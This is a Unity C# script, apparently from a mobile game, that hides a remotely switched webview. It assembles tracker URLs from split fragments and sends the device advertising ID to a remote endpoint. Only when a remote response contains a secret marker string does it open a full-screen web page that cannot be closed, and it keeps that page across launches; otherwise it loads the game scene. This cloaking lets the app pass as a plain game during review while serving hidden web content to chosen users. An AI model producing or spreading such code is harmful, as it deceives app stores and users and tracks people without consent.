using UnityEngine;
using UnityEngine.Events;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using System;
using System.Collections;
using System.Collections.Generic;

public class MainPOC : MonoBehaviour
{    
    public List<string> splitters; //Splitted Keitaro First Campaign Link
    public List<string> splitters1; //Splitted Register Installation Link https://www.dmtgames.pro/installed
    public List<string> splitters2; //Splitted Install Event Endpoint Link https://www.dmtgames.pro/track_app_installs
    public List<string> ubPOCs; // subs we need
    [HideInInspector] public string onePOCnazv = ""; //Device Advertising ID
    [HideInInspector] public string twoPOCnazv = ""; //Link constructed from "splitters"
    [HideInInspector] public string twoPOCnazv1 = ""; //Link constructed from "splitters1"
    [HideInInspector] public string twoPOCnazv2 = ""; //Link constructed from "splitters2"

    private Dictionary<string, object> exubPOCs; // Extracted deeplink subs
    private bool? _isexPOC; // Is this link is deeplink
    private string _exPOC; // final deeplink link

    private bool POCLo = false; // is webview loading

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaPOC") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { onePOCnazv = advertisingId; });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            StartCoroutine(CANTPOCOP(5));

            foreach (string n in splitters)
                    twoPOCnazv += n;

                foreach (string n in splitters1)
                    twoPOCnazv1 += n;
                
                foreach (string n in splitters2)
                    twoPOCnazv2 += n;

                StartCoroutine(POCSECGE(twoPOCnazv1));

                StartCoroutine(FirstTimePOCOpen());
        }

        else
            MovePOC();
    }

    private IEnumerator FirstTimePOCOpen()
    {
        if (PlayerPrefs.GetInt("FirstTimeOpening?", 1) == 1)
        {
            PlayerPrefs.SetInt("FirstTimeOpening", 0);

            string fullInstallPOCEventEndpoint = twoPOCnazv2 + string.Format("?advertiser_tracking_id={0}", onePOCnazv);

            using (UnityWebRequest request = UnityWebRequest.Get(fullInstallPOCEventEndpoint))
            {
                yield return request.SendWebRequest();
            }
        }
    }

    private IEnumerator CANTPOCOP(int tioc)
    {
        yield return new WaitForSeconds(tioc);

        if(POCLo)
            yield break;

        else
            STARTIENUMENATORPOC(false);

            yield break;
    }

    private IEnumerator IENUMENATORPOC(bool isexPOC)
    {
        using (UnityWebRequest poc = UnityWebRequest.Get(twoPOCnazv))
        {
            yield return poc.SendWebRequest();

            if (poc.result == UnityWebRequest.Result.ProtocolError || poc.result == UnityWebRequest.Result.ConnectionError)
                MovePOC();

            if(!isexPOC && PlayerPrefs.GetString("AdresPOCquote", string.Empty) != string.Empty)
            {
                GRIDPOCSEE(PlayerPrefs.GetString("AdresPOCquote"));

                POCLo = true;

                yield break;
            }

            int schemePOC = 7;

            while (PlayerPrefs.GetString("glrobo", "") == "" && schemePOC > 0)
            {
                yield return new WaitForSeconds(1);
                schemePOC--;
            }

            try
            {
                if (poc.result == UnityWebRequest.Result.Success)
                {
                    if (poc.downloadHandler.text.Contains("PrmdfChlljkXoEQS"))
                    {
                        switch (isexPOC)
                        {
                            case true:
                                string POCfin = poc.downloadHandler.text.Replace("\"", "");

                                POCfin += "/?";

                                try
                                {
                                    for (int i = 0; i < ubPOCs.Capacity; i++)
                                    {
                                        foreach (KeyValuePair<string, object> entry in exubPOCs)
                                        {
                                           if (entry.Key.Contains(string.Format("sub{0}", i + 1)))
                                                POCfin += ubPOCs[i] + "=" + entry.Value + "&";
                                        }
                                    }

                                    POCfin = POCfin.Remove(POCfin.Length - 1);

                                    Debug.Log(POCfin);          

                                    GRIDPOCSEE(POCfin);

                                    POCLo = true;
                                }

                                catch
                                {
                                    goto case false;
                                }

                                break;

                            case false:
                                try
                                {
                                    var subscs = poc.downloadHandler.text.Split('|');
                                    POCfin =  subscs[0] + "?idfa=" + onePOCnazv;

                                    PlayerPrefs.SetString("AdresPOCquote", POCfin);

                                    GRIDPOCSEE(POCfin, subscs[1]);  

                                    POCLo = true;                               
                                }

                                catch
                                {
                                    POCfin = poc.downloadHandler.text + "?idfa=" + onePOCnazv;
                                    
                                    PlayerPrefs.SetString("AdresPOCquote", POCfin);
                                    
                                    GRIDPOCSEE(POCfin);

                                    POCLo = true;
                                }

                                break;
                        }
                    }

                    else
                        MovePOC();
                }

                else
                    MovePOC();
            }

            catch
            {
                MovePOC();
            }
        }
    }

    private void STARTIENUMENATORPOC(bool isexPOC) => StartCoroutine(IENUMENATORPOC(isexPOC));

    private void GRIDPOCSEE(string AdresPOCquote, string NamingPOC = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);

        var _connectsPOC = gameObject.AddComponent<UniWebView>();
        _connectsPOC.SetToolbarDoneButtonText("");

        switch (NamingPOC)
        {
            case "0":
                _connectsPOC.SetShowToolbar(true, false, false, true);
                break;

            default:
                _connectsPOC.SetShowToolbar(false);
                break;
        }

        _connectsPOC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);

        _connectsPOC.OnShouldClose += (view) =>
        {
            return false;
        };

        _connectsPOC.SetSupportMultipleWindows(true);
        _connectsPOC.SetAllowBackForwardNavigationGestures(true);

        _connectsPOC.OnMultipleWindowOpened += (view, windowId) =>
        {
            _connectsPOC.SetShowToolbar(true);

        };

        _connectsPOC.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingPOC)
            {
                case "0":
                    _connectsPOC.SetShowToolbar(true, false, false, true);
                    break;

                default:
                    _connectsPOC.SetShowToolbar(false);
                    break;
            }
        };

        _connectsPOC.OnOrientationChanged += (view, orientation) =>
        {
            _connectsPOC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };

        _connectsPOC.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("AdresPOCquote", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("AdresPOCquote", url);
            }
        };

        _connectsPOC.Load(AdresPOCquote);
        _connectsPOC.Show();
    }

    private void MovePOC()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("EnterScreen");
    }

    private IEnumerator POCSECGE(string liPOC)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(liPOC))
        {
            yield return request.SendWebRequest();

            try
            {
                if (request.result == UnityWebRequest.Result.Success) 
                    _exPOC = request.downloadHandler.text.Replace("\"", "");

                else if (request.result == UnityWebRequest.Result.ProtocolError || request.result == UnityWebRequest.Result.ConnectionError) 
                {
                    throw new Exception("Error");
                }

                exubPOCs = CONVERTPOCPROCESS(new Uri(_exPOC).Query);

                if(exubPOCs == new Dictionary<string, object>())
                {
                    _isexPOC = false;
                
                    STARTIENUMENATORPOC(_isexPOC.Value);
                }

                else
                {
                    _isexPOC = true;
                
                    STARTIENUMENATORPOC(_isexPOC.Value);
                }
            }

            catch(Exception e) 
            {
                Debug.Log(e.ToString());
            }
        }
    }

    private Dictionary<string, object> CONVERTPOCPROCESS(string POCqueue)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();

        try
        {
            string processedPOCqueue = POCqueue.Remove(0, 1);
            string[] pairs = processedPOCqueue.Split('&')[1..(processedPOCqueue.Split('&').Length - 1)];

            foreach(string pair in pairs) 
            {
                string[] splittedPOCqueuPair = pair.Split("=");

                result.Add(splittedPOCqueuPair[0], splittedPOCqueuPair[1]);

                Debug.Log("Sub Name: " + splittedPOCqueuPair[0] + ", Sub Value: " + splittedPOCqueuPair[1]);
            }
        }
        
        catch
        {
            return new Dictionary<string, object>();
        }

        return result;
    }
}
